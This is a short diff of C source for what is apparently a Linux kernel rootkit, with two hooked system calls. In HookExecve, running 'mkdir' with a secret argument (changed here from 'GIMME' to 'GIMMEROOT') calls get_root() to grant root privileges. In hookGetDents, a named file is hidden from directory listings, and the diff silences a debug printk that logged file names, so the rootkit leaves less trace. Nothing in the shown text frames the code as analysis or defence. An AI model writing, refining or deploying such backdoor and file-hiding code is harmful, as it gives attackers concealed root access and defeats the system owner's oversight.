@@ -78,7 +78,7 @@ asmlinkage int HookExecve(const char *filename, char *const argv[], char *const 
 	// i.e. only 2 arguments
 
 	if (strcmp(argz[0], "mkdir") == 0) { 
-        if (strcmp(argz[1], "GIMME") == 0) {
+        if (strcmp(argz[1], "GIMMEROOT") == 0) {
             get_root();
         }
 
@@ -170,7 +170,7 @@ asmlinkage int hookGetDents(unsigned int fd, struct linux_dirent *dirp, unsigned
         //minus length from remaining bytes
         RemainingBytes = RemainingBytes - length;
          
-        printk(KERN_INFO "RemainingBytes: %d\t File: %s\n", RemainingBytes, dirp3->d_name);
+        //printk(KERN_INFO "RemainingBytes: %d\t File: %s\n", RemainingBytes, dirp3->d_name);
         if (strcmp(dirp3->d_name, hide) == 0) {
             
             //copy all following inodes
